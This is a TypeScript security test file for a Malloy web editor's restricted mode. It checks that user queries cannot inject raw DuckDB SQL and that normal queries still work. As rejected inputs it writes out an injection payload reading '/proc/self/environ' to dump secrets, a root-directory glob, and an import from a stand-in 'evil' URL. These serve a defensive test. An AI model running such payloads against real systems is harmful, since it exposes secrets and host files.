// Copyright (c) The Malloy Foundation
// SPDX-License-Identifier: MIT

// SECURITY TEST for the /ltool web editor's execution path (/api/run →
// runQueryForWeb / saveWebQuery → runRestrictedMalloyFiles).
//
// This surface accepts free-form Malloy from any signed-in user. It must run
// through core's restricted mode, so user QUERY text cannot introduce raw SQL.
// Raw SQL is equivalent to filesystem access in DuckDB — read_text/read_blob/
// glob take absolute paths and run in-process — so an open compiler here would
// let a query read the container's environment and secrets.
//
// The last test is the one that keeps this honest: a MODEL may still define
// duckdb.sql() sources, and querying them normally must keep working.
// Restricted mode constrains query text, not model text.
//
// Hermetic: in-memory duckdb.sql() source, no network / DB.
// Run: npm test   (tsx --test src/lib/*.test.ts)

import "@malloydata/db-duckdb/native"; // ensure the duckdb connector loads under tsx
import { test } from "node:test";
import assert from "node:assert/strict";
import { runRestrictedMalloyFiles } from "./malloy";

// A model that itself uses duckdb.sql() — the normal case for this codebase
// (see examples/babynames). Querying it must stay unaffected.
const MODEL = `
source: nums is duckdb.sql("""
  SELECT 1 AS n UNION ALL SELECT 2 UNION ALL SELECT 3
""") extend {
  measure: c is count()
  measure: total is n.sum()
}
`;

const files = () => new Map([["index.malloy", MODEL]]);

async function runQuery(query: string) {
  return runRestrictedMalloyFiles(files(), "index.malloy", query, { rowLimit: 10 });
}

async function expectRejected(query: string, label: string) {
  await assert.rejects(
    () => runQuery(query),
    (err: unknown) => {
      const msg = err instanceof Error ? err.message : String(err);
      // Core rejects restricted constructs; the message names the construct or
      // carries the 'restricted' marker. Assert it FAILED for a policy reason,
      // not that it merely errored on something incidental.
      assert.match(
        msg,
        /restricted|not permitted|not allowed|forbidden/i,
        `${label}: expected a restricted-mode rejection, got: ${msg}`,
      );
      return true;
    },
    `${label}: query should have been rejected but it ran`,
  );
}

test("rejects raw SQL in user query text (the /api/run vulnerability)", async () => {
  await expectRejected(
    `run: duckdb.sql("""SELECT 1 AS x""")`,
    "bare duckdb.sql",
  );
});

test("rejects the filesystem-read payload", async () => {
  // The concrete exploit: raw SQL is a filesystem primitive in DuckDB, so this
  // would return the process environment (and every secret in it) as rows.
  await expectRejected(
    `run: duckdb.sql("""SELECT content FROM read_text('/proc/self/environ')""")`,
    "read_text /proc/self/environ",
  );
  await expectRejected(
    `run: duckdb.sql("""SELECT file FROM glob('/*')""")`,
    "glob filesystem",
  );
});

test("rejects import in user query text", async () => {
  await expectRejected(
    `import "https://example.com/evil.malloy"\nrun: nums -> { aggregate: c }`,
    "import",
  );
});

test("normal analytical Malloy still works", async () => {
  const res = await runQuery(`run: nums -> { aggregate: c, total }`);
  assert.equal(res.rowCount, 1);
  assert.equal(Number(res.rows[0].c), 3);
  assert.equal(Number(res.rows[0].total), 6);
  assert.ok(res.sql.length > 0, "compiled SQL should still be returned (ltool shows it)");
});

test("a model defining duckdb.sql() sources is still queryable", async () => {
  // Restricted mode constrains QUERY text, not MODEL text. If this ever fails,
  // the fix has over-reached and broken every real dataset.
  const res = await runQuery(`run: nums -> { group_by: n; order_by: n }`);
  assert.equal(res.rowCount, 3);
  assert.deepEqual(res.rows.map((r) => Number(r.n)), [1, 2, 3]);
});
